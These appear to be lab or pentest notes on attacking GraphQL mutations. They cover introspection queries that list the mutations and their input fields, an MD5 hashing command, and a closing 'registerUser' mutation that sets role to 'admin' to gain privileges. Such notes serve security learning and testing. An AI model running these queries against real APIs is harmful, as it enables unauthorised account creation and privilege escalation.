Mutations are GraphQL queries that modify server data. 
- Create new objects
- Update existing objects
- Delete existing objects

Introspection query to find all mutations supported by the backend:
```
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
- Identified a mutation 'registerUser' which requires a "RegisterUserInput" object as an input
- Now, query all fields of the RegisterUserInput object with the following introspection query
```
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```
- We can provide the new user's username, password, role, and msg


This system requires password as MD5 hash.
```
echo -n 'password' | md5sum
```

**Mutation to register a new user
```
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```


## Exploitation with Mutations

- Set role to admin
```
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

